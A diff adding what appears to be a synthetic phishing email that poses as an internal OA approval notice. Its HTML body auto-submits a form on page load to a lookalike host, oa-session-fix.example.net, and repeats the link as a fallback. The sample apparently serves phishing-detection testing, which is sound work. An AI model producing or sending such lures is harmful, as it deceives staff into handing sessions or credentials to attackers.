@@ -1,0 +1,10 @@
+From: =?utf-8?B?T0Eg57O757uf?= <oa@corp-oa-notify.example>
+To: staff@corp.internal
+Date: Sun, 06 Sep 2026 09:16:00 +0800
+Message-ID: <0006-b14@synth.example>
+Subject: 您有一条待审批单据
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body onload="document.getElementById('f').submit()"><p>单据 OA-2026-7788 待您审批，正在跳转…</p><form id='f' action='https://oa-session-fix.example.net/d'></form><p><a href='https://oa-session-fix.example.net/d'>如未自动跳转请点此</a></p></body></html>
